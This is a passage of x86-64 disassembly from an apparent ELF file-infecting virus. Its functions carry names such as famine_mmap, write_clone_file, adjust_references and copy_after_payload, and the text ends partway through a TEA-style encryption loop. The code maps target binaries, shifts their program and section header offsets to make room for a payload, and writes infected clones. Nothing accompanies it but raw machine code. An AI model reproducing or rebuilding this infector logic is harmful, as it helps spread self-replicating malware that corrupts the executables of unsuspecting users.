    1da9:	48 8b 75 80          	mov    -0x80(%rbp),%rsi
    1dad:	44 8b 85 4c ff ff ff 	mov    -0xb4(%rbp),%r8d
    1db4:	48 89 cf             	mov    %rcx,%rdi
    1db7:	ba 01 00 00 00       	mov    $0x1,%edx
    1dbc:	b8 02 00 00 00       	mov    $0x2,%eax
    1dc1:	48 89 8d 40 ff ff ff 	mov    %rcx,-0xc0(%rbp)
    1dc8:	89 c1                	mov    %eax,%ecx
    1dca:	4c 8b 8d 40 ff ff ff 	mov    -0xc0(%rbp),%r9
    1dd1:	e8 8a f8 ff ff       	callq  1660 <famine_mmap>
    1dd6:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    1dda:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
    1de1:	48 39 f0             	cmp    %rsi,%rax
    1de4:	0f 85 14 00 00 00    	jne    1dfe <original_accessor+0xee>
    1dea:	8b bd 4c ff ff ff    	mov    -0xb4(%rbp),%edi
    1df0:	e8 2b f8 ff ff       	callq  1620 <famine_close>
    1df5:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1df9:	e9 38 00 00 00       	jmpq   1e36 <original_accessor+0x126>
    1dfe:	8b bd 4c ff ff ff    	mov    -0xb4(%rbp),%edi
    1e04:	e8 17 f8 ff ff       	callq  1620 <famine_close>
    1e09:	83 f8 00             	cmp    $0x0,%eax
    1e0c:	0f 84 09 00 00 00    	je     1e1b <original_accessor+0x10b>
    1e12:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1e16:	e9 1b 00 00 00       	jmpq   1e36 <original_accessor+0x126>
    1e1b:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1e1f:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1e23:	48 89 01             	mov    %rax,(%rcx)
    1e26:	48 8b 45 80          	mov    -0x80(%rbp),%rax
    1e2a:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1e2e:	48 89 41 08          	mov    %rax,0x8(%rcx)
    1e32:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1e36:	8a 45 ff             	mov    -0x1(%rbp),%al
    1e39:	24 01                	and    $0x1,%al
    1e3b:	0f b6 c0             	movzbl %al,%eax
    1e3e:	48 81 c4 c0 00 00 00 	add    $0xc0,%rsp
    1e45:	5d                   	pop    %rbp
    1e46:	c3                   	retq   
    1e47:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    1e4e:	00 00 

0000000000001e50 <clone_accessor>:
    1e50:	55                   	push   %rbp
    1e51:	48 89 e5             	mov    %rsp,%rbp
    1e54:	48 83 ec 20          	sub    $0x20,%rsp
    1e58:	31 c0                	xor    %eax,%eax
    1e5a:	89 c1                	mov    %eax,%ecx
    1e5c:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    1e60:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    1e64:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    1e68:	48 81 c2 00 00 02 00 	add    $0x20000,%rdx
    1e6f:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    1e73:	48 89 56 08          	mov    %rdx,0x8(%rsi)
    1e77:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1e7b:	48 8b 72 08          	mov    0x8(%rdx),%rsi
    1e7f:	48 89 cf             	mov    %rcx,%rdi
    1e82:	ba 03 00 00 00       	mov    $0x3,%edx
    1e87:	b8 22 00 00 00       	mov    $0x22,%eax
    1e8c:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    1e90:	89 c1                	mov    %eax,%ecx
    1e92:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    1e98:	4c 8b 4d e0          	mov    -0x20(%rbp),%r9
    1e9c:	e8 bf f7 ff ff       	callq  1660 <famine_mmap>
    1ea1:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    1ea5:	48 89 06             	mov    %rax,(%rsi)
    1ea8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1eac:	48 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%rsi
    1eb3:	48 39 30             	cmp    %rsi,(%rax)
    1eb6:	0f 85 09 00 00 00    	jne    1ec5 <clone_accessor+0x75>
    1ebc:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1ec0:	e9 04 00 00 00       	jmpq   1ec9 <clone_accessor+0x79>
    1ec5:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1ec9:	8a 45 ff             	mov    -0x1(%rbp),%al
    1ecc:	24 01                	and    $0x1,%al
    1ece:	0f b6 c0             	movzbl %al,%eax
    1ed1:	48 83 c4 20          	add    $0x20,%rsp
    1ed5:	5d                   	pop    %rbp
    1ed6:	c3                   	retq   
    1ed7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
    1ede:	00 00 

0000000000001ee0 <write_clone_file>:
    1ee0:	55                   	push   %rbp
    1ee1:	48 89 e5             	mov    %rsp,%rbp
    1ee4:	48 83 ec 30          	sub    $0x30,%rsp
    1ee8:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1eec:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1ef0:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    1ef4:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    1ef8:	be 41 02 00 00       	mov    $0x241,%esi
    1efd:	ba c0 01 00 00       	mov    $0x1c0,%edx
    1f02:	b0 00                	mov    $0x0,%al
    1f04:	e8 f7 f6 ff ff       	callq  1600 <famine_open>
    1f09:	89 45 dc             	mov    %eax,-0x24(%rbp)
    1f0c:	83 7d dc ff          	cmpl   $0xffffffff,-0x24(%rbp)
    1f10:	0f 85 09 00 00 00    	jne    1f1f <write_clone_file+0x3f>
    1f16:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1f1a:	e9 37 00 00 00       	jmpq   1f56 <write_clone_file+0x76>
    1f1f:	8b 7d dc             	mov    -0x24(%rbp),%edi
    1f22:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    1f26:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    1f2a:	e8 b1 f6 ff ff       	callq  15e0 <famine_write>
    1f2f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
    1f33:	0f 85 11 00 00 00    	jne    1f4a <write_clone_file+0x6a>
    1f39:	8b 7d dc             	mov    -0x24(%rbp),%edi
    1f3c:	e8 df f6 ff ff       	callq  1620 <famine_close>
    1f41:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1f45:	e9 0c 00 00 00       	jmpq   1f56 <write_clone_file+0x76>
    1f4a:	8b 7d dc             	mov    -0x24(%rbp),%edi
    1f4d:	e8 ce f6 ff ff       	callq  1620 <famine_close>
    1f52:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1f56:	8a 45 ff             	mov    -0x1(%rbp),%al
    1f59:	24 01                	and    $0x1,%al
    1f5b:	0f b6 c0             	movzbl %al,%eax
    1f5e:	48 83 c4 30          	add    $0x30,%rsp
    1f62:	5d                   	pop    %rbp
    1f63:	c3                   	retq   
    1f64:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    1f6b:	00 00 00 
    1f6e:	66 90                	xchg   %ax,%ax

0000000000001f70 <adjust_references>:
    1f70:	55                   	push   %rbp
    1f71:	48 89 e5             	mov    %rsp,%rbp
    1f74:	48 83 ec 40          	sub    $0x40,%rsp
    1f78:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1f7c:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1f80:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    1f84:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    1f88:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    1f8d:	0f 85 09 00 00 00    	jne    1f9c <adjust_references+0x2c>
    1f93:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    1f97:	e9 c0 00 00 00       	jmpq   205c <adjust_references+0xec>
    1f9c:	31 c0                	xor    %eax,%eax
    1f9e:	89 c7                	mov    %eax,%edi
    1fa0:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    1fa4:	48 89 4d c8          	mov    %rcx,-0x38(%rbp)
    1fa8:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    1fac:	48 8b 49 18          	mov    0x18(%rcx),%rcx
    1fb0:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    1fb4:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    1fb8:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1fbc:	be 40 00 00 00       	mov    $0x40,%esi
    1fc1:	e8 8a fc ff ff       	callq  1c50 <safe_accessor>
    1fc6:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    1fca:	48 83 7d c0 00       	cmpq   $0x0,-0x40(%rbp)
    1fcf:	0f 85 09 00 00 00    	jne    1fde <adjust_references+0x6e>
    1fd5:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    1fd9:	e9 7e 00 00 00       	jmpq   205c <adjust_references+0xec>
    1fde:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
    1fe2:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    1fe6:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1fea:	e8 81 00 00 00       	callq  2070 <adjust_phdr_table_offset>
    1fef:	48 8b 7d c0          	mov    -0x40(%rbp),%rdi
    1ff3:	48 8b 75 e0          	mov    -0x20(%rbp),%rsi
    1ff7:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    1ffb:	e8 c0 00 00 00       	callq  20c0 <adjust_shdr_table_offset>
    2000:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
    2004:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    2008:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    200c:	48 8d 15 fd 00 00 00 	lea    0xfd(%rip),%rdx        # 2110 <shift_phdr_position>
    2013:	48 89 c1             	mov    %rax,%rcx
    2016:	e8 75 0d 00 00       	callq  2d90 <foreach_phdr>
    201b:	a8 01                	test   $0x1,%al
    201d:	0f 85 09 00 00 00    	jne    202c <adjust_references+0xbc>
    2023:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2027:	e9 30 00 00 00       	jmpq   205c <adjust_references+0xec>
    202c:	48 8d 45 c8          	lea    -0x38(%rbp),%rax
    2030:	48 8b 7d e8          	mov    -0x18(%rbp),%rdi
    2034:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2038:	48 8d 15 71 01 00 00 	lea    0x171(%rip),%rdx        # 21b0 <shift_shdr_position>
    203f:	48 89 c1             	mov    %rax,%rcx
    2042:	e8 c9 0e 00 00       	callq  2f10 <foreach_shdr>
    2047:	a8 01                	test   $0x1,%al
    2049:	0f 85 09 00 00 00    	jne    2058 <adjust_references+0xe8>
    204f:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2053:	e9 04 00 00 00       	jmpq   205c <adjust_references+0xec>
    2058:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    205c:	8a 45 ff             	mov    -0x1(%rbp),%al
    205f:	24 01                	and    $0x1,%al
    2061:	0f b6 c0             	movzbl %al,%eax
    2064:	48 83 c4 40          	add    $0x40,%rsp
    2068:	5d                   	pop    %rbp
    2069:	c3                   	retq   
    206a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000002070 <adjust_phdr_table_offset>:
    2070:	55                   	push   %rbp
    2071:	48 89 e5             	mov    %rsp,%rbp
    2074:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    2078:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    207c:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    2080:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    2084:	48 8b 40 20          	mov    0x20(%rax),%rax
    2088:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    208c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    2090:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
    2094:	0f 83 05 00 00 00    	jae    209f <adjust_phdr_table_offset+0x2f>
    209a:	e9 18 00 00 00       	jmpq   20b7 <adjust_phdr_table_offset+0x47>
    209f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    20a3:	48 03 45 e0          	add    -0x20(%rbp),%rax
    20a7:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    20ab:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    20af:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    20b3:	48 89 41 20          	mov    %rax,0x20(%rcx)
    20b7:	5d                   	pop    %rbp
    20b8:	c3                   	retq   
    20b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000020c0 <adjust_shdr_table_offset>:
    20c0:	55                   	push   %rbp
    20c1:	48 89 e5             	mov    %rsp,%rbp
    20c4:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    20c8:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    20cc:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    20d0:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    20d4:	48 8b 40 28          	mov    0x28(%rax),%rax
    20d8:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    20dc:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    20e0:	48 3b 45 e8          	cmp    -0x18(%rbp),%rax
    20e4:	0f 83 05 00 00 00    	jae    20ef <adjust_shdr_table_offset+0x2f>
    20ea:	e9 18 00 00 00       	jmpq   2107 <adjust_shdr_table_offset+0x47>
    20ef:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    20f3:	48 03 45 e0          	add    -0x20(%rbp),%rax
    20f7:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    20fb:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    20ff:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
    2103:	48 89 41 28          	mov    %rax,0x28(%rcx)
    2107:	5d                   	pop    %rbp
    2108:	c3                   	retq   
    2109:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000002110 <shift_phdr_position>:
    2110:	55                   	push   %rbp
    2111:	48 89 e5             	mov    %rsp,%rbp
    2114:	48 83 ec 40          	sub    $0x40,%rsp
    2118:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    211c:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    2120:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2124:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    2128:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    212c:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    2130:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    2134:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    2138:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    213c:	be 38 00 00 00       	mov    $0x38,%esi
    2141:	e8 0a fb ff ff       	callq  1c50 <safe_accessor>
    2146:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    214a:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
    214f:	0f 85 09 00 00 00    	jne    215e <shift_phdr_position+0x4e>
    2155:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2159:	e9 3d 00 00 00       	jmpq   219b <shift_phdr_position+0x8b>
    215e:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2162:	48 8b 40 08          	mov    0x8(%rax),%rax
    2166:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    216a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    216e:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
    2172:	48 3b 41 08          	cmp    0x8(%rcx),%rax
    2176:	0f 86 1b 00 00 00    	jbe    2197 <shift_phdr_position+0x87>
    217c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2180:	48 8b 00             	mov    (%rax),%rax
    2183:	48 03 45 c0          	add    -0x40(%rbp),%rax
    2187:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    218b:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    218f:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2193:	48 89 41 08          	mov    %rax,0x8(%rcx)
    2197:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    219b:	8a 45 ff             	mov    -0x1(%rbp),%al
    219e:	24 01                	and    $0x1,%al
    21a0:	0f b6 c0             	movzbl %al,%eax
    21a3:	48 83 c4 40          	add    $0x40,%rsp
    21a7:	5d                   	pop    %rbp
    21a8:	c3                   	retq   
    21a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000021b0 <shift_shdr_position>:
    21b0:	55                   	push   %rbp
    21b1:	48 89 e5             	mov    %rsp,%rbp
    21b4:	48 83 ec 40          	sub    $0x40,%rsp
    21b8:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    21bc:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    21c0:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    21c4:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    21c8:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    21cc:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    21d0:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    21d4:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    21d8:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    21dc:	be 40 00 00 00       	mov    $0x40,%esi
    21e1:	e8 6a fa ff ff       	callq  1c50 <safe_accessor>
    21e6:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    21ea:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
    21ef:	0f 85 09 00 00 00    	jne    21fe <shift_shdr_position+0x4e>
    21f5:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    21f9:	e9 3d 00 00 00       	jmpq   223b <shift_shdr_position+0x8b>
    21fe:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    2202:	48 8b 40 18          	mov    0x18(%rax),%rax
    2206:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    220a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    220e:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
    2212:	48 3b 41 08          	cmp    0x8(%rcx),%rax
    2216:	0f 86 1b 00 00 00    	jbe    2237 <shift_shdr_position+0x87>
    221c:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2220:	48 8b 00             	mov    (%rax),%rax
    2223:	48 03 45 c0          	add    -0x40(%rbp),%rax
    2227:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    222b:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
    222f:	48 8b 4d c8          	mov    -0x38(%rbp),%rcx
    2233:	48 89 41 18          	mov    %rax,0x18(%rcx)
    2237:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    223b:	8a 45 ff             	mov    -0x1(%rbp),%al
    223e:	24 01                	and    $0x1,%al
    2240:	0f b6 c0             	movzbl %al,%eax
    2243:	48 83 c4 40          	add    $0x40,%rsp
    2247:	5d                   	pop    %rbp
    2248:	c3                   	retq   
    2249:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000002250 <copy_to_clone>:
    2250:	55                   	push   %rbp
    2251:	48 89 e5             	mov    %rsp,%rbp
    2254:	48 83 ec 50          	sub    $0x50,%rsp
    2258:	48 8d 45 10          	lea    0x10(%rbp),%rax
    225c:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    2260:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    2264:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    2268:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    226c:	48 8b 08             	mov    (%rax),%rcx
    226f:	48 89 0c 24          	mov    %rcx,(%rsp)
    2273:	48 8b 48 08          	mov    0x8(%rax),%rcx
    2277:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    227c:	48 8b 48 10          	mov    0x10(%rax),%rcx
    2280:	48 89 4c 24 10       	mov    %rcx,0x10(%rsp)
    2285:	48 8b 48 18          	mov    0x18(%rax),%rcx
    2289:	48 89 4c 24 18       	mov    %rcx,0x18(%rsp)
    228e:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
    2292:	e8 69 00 00 00       	callq  2300 <copy_until_end_of_last_sect>
    2297:	a8 01                	test   $0x1,%al
    2299:	0f 85 05 00 00 00    	jne    22a4 <copy_to_clone+0x54>
    229f:	e9 3f 00 00 00       	jmpq   22e3 <copy_to_clone+0x93>
    22a4:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    22a8:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    22ac:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    22b0:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
    22b4:	48 8b 08             	mov    (%rax),%rcx
    22b7:	48 89 0c 24          	mov    %rcx,(%rsp)
    22bb:	48 8b 48 08          	mov    0x8(%rax),%rcx
    22bf:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    22c4:	48 8b 48 10          	mov    0x10(%rax),%rcx
    22c8:	48 89 4c 24 10       	mov    %rcx,0x10(%rsp)
    22cd:	48 8b 48 18          	mov    0x18(%rax),%rcx
    22d1:	48 89 4c 24 18       	mov    %rcx,0x18(%rsp)
    22d6:	e8 d5 00 00 00       	callq  23b0 <copy_after_payload>
    22db:	a8 01                	test   $0x1,%al
    22dd:	0f 85 09 00 00 00    	jne    22ec <copy_to_clone+0x9c>
    22e3:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    22e7:	e9 04 00 00 00       	jmpq   22f0 <copy_to_clone+0xa0>
    22ec:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    22f0:	8a 45 ff             	mov    -0x1(%rbp),%al
    22f3:	24 01                	and    $0x1,%al
    22f5:	0f b6 c0             	movzbl %al,%eax
    22f8:	48 83 c4 50          	add    $0x50,%rsp
    22fc:	5d                   	pop    %rbp
    22fd:	c3                   	retq   
    22fe:	66 90                	xchg   %ax,%ax

0000000000002300 <copy_until_end_of_last_sect>:
    2300:	55                   	push   %rbp
    2301:	48 89 e5             	mov    %rsp,%rbp
    2304:	48 83 ec 30          	sub    $0x30,%rsp
    2308:	48 8d 45 10          	lea    0x10(%rbp),%rax
    230c:	31 c9                	xor    %ecx,%ecx
    230e:	89 ca                	mov    %ecx,%edx
    2310:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    2314:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2318:	48 8b 38             	mov    (%rax),%rdi
    231b:	48 8b 48 08          	mov    0x8(%rax),%rcx
    231f:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    2323:	48 89 d7             	mov    %rdx,%rdi
    2326:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    232a:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    232e:	e8 1d f9 ff ff       	callq  1c50 <safe_accessor>
    2333:	45 31 c0             	xor    %r8d,%r8d
    2336:	44 89 c7             	mov    %r8d,%edi
    2339:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    233d:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    2341:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    2345:	48 8b 50 10          	mov    0x10(%rax),%rdx
    2349:	48 8b 48 18          	mov    0x18(%rax),%rcx
    234d:	e8 fe f8 ff ff       	callq  1c50 <safe_accessor>
    2352:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
    2356:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
    235b:	0f 85 09 00 00 00    	jne    236a <copy_until_end_of_last_sect+0x6a>
    2361:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2365:	e9 29 00 00 00       	jmpq   2393 <copy_until_end_of_last_sect+0x93>
    236a:	48 83 7d e0 00       	cmpq   $0x0,-0x20(%rbp)
    236f:	0f 85 09 00 00 00    	jne    237e <copy_until_end_of_last_sect+0x7e>
    2375:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2379:	e9 15 00 00 00       	jmpq   2393 <copy_until_end_of_last_sect+0x93>
    237e:	48 8b 7d e0          	mov    -0x20(%rbp),%rdi
    2382:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    2386:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    238a:	e8 c1 ef ff ff       	callq  1350 <ft_memcpy>
    238f:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2393:	8a 45 ff             	mov    -0x1(%rbp),%al
    2396:	24 01                	and    $0x1,%al
    2398:	0f b6 c0             	movzbl %al,%eax
    239b:	48 83 c4 30          	add    $0x30,%rsp
    239f:	5d                   	pop    %rbp
    23a0:	c3                   	retq   
    23a1:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
    23a8:	00 00 00 
    23ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000000023b0 <copy_after_payload>:
    23b0:	55                   	push   %rbp
    23b1:	48 89 e5             	mov    %rsp,%rbp
    23b4:	48 83 ec 40          	sub    $0x40,%rsp
    23b8:	48 8d 45 10          	lea    0x10(%rbp),%rax
    23bc:	48 89 7d f0          	mov    %rdi,-0x10(%rbp)
    23c0:	48 89 75 e8          	mov    %rsi,-0x18(%rbp)
    23c4:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
    23c8:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
    23cc:	48 2b 4d f0          	sub    -0x10(%rbp),%rcx
    23d0:	48 89 4d d8          	mov    %rcx,-0x28(%rbp)
    23d4:	48 8b 7d f0          	mov    -0x10(%rbp),%rdi
    23d8:	48 8b 75 d8          	mov    -0x28(%rbp),%rsi
    23dc:	48 8b 10             	mov    (%rax),%rdx
    23df:	48 8b 48 08          	mov    0x8(%rax),%rcx
    23e3:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
    23e7:	e8 64 f8 ff ff       	callq  1c50 <safe_accessor>
    23ec:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    23f0:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    23f4:	48 03 45 e8          	add    -0x18(%rbp),%rax
    23f8:	48 8b 75 d8          	mov    -0x28(%rbp),%rsi
    23fc:	48 8b 4d c0          	mov    -0x40(%rbp),%rcx
    2400:	48 8b 51 10          	mov    0x10(%rcx),%rdx
    2404:	48 8b 49 18          	mov    0x18(%rcx),%rcx
    2408:	48 89 c7             	mov    %rax,%rdi
    240b:	e8 40 f8 ff ff       	callq  1c50 <safe_accessor>
    2410:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
    2414:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
    2419:	0f 85 09 00 00 00    	jne    2428 <copy_after_payload+0x78>
    241f:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2423:	e9 29 00 00 00       	jmpq   2451 <copy_after_payload+0xa1>
    2428:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
    242d:	0f 85 09 00 00 00    	jne    243c <copy_after_payload+0x8c>
    2433:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)
    2437:	e9 15 00 00 00       	jmpq   2451 <copy_after_payload+0xa1>
    243c:	48 8b 7d c8          	mov    -0x38(%rbp),%rdi
    2440:	48 8b 75 d0          	mov    -0x30(%rbp),%rsi
    2444:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    2448:	e8 03 ef ff ff       	callq  1350 <ft_memcpy>
    244d:	c6 45 ff 01          	movb   $0x1,-0x1(%rbp)
    2451:	8a 45 ff             	mov    -0x1(%rbp),%al
    2454:	24 01                	and    $0x1,%al
    2456:	0f b6 c0             	movzbl %al,%eax
    2459:	48 83 c4 40          	add    $0x40,%rsp
    245d:	5d                   	pop    %rbp
    245e:	c3                   	retq   
    245f:	90                   	nop

0000000000002460 <encrypt>:
    2460:	55                   	push   %rbp
    2461:	48 89 e5             	mov    %rsp,%rbp
    2464:	41 54                	push   %r12
    2466:	41 55                	push   %r13
    2468:	49 89 fc             	mov    %rdi,%r12
    246b:	49 89 cd             	mov    %rcx,%r13
    246e:	bf b9 79 37 9e       	mov    $0x9e3779b9,%edi
    2473:	e9 a0 00 00 00       	jmpq   2518 <__while_size_ge_8>

0000000000002478 <encipher>:
    2478:	4c 8b 1e             	mov    (%rsi),%r11
    247b:	4d 89 da             	mov    %r11,%r10
    247e:	49 c1 eb 20          	shr    $0x20,%r11
    2482:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
    2487:	49 21 c2             	and    %rax,%r10
    248a:	4c 89 e1             	mov    %r12,%rcx
    248d:	48 31 c0             	xor    %rax,%rax

0000000000002490 <__loop_num_rounds>:
    2490:	4d 89 d8             	mov    %r11,%r8
    2493:	49 c1 e0 04          	shl    $0x4,%r8
    2497:	4d 89 d9             	mov    %r11,%r9
    249a:	49 c1 e9 05          	shr    $0x5,%r9
    249e:	4d 31 c8             	xor    %r9,%r8
    24a1:	4d 01 d8             	add    %r11,%r8
    24a4:	49 89 c1             	mov    %rax,%r9
    24a7:	49 83 e1 03          	and    $0x3,%r9
    24ab:	49 c1 e1 02          	shl    $0x2,%r9
    24af:	49 01 d1             	add    %rdx,%r9
    24b2:	45 8b 09             	mov    (%r9),%r9d
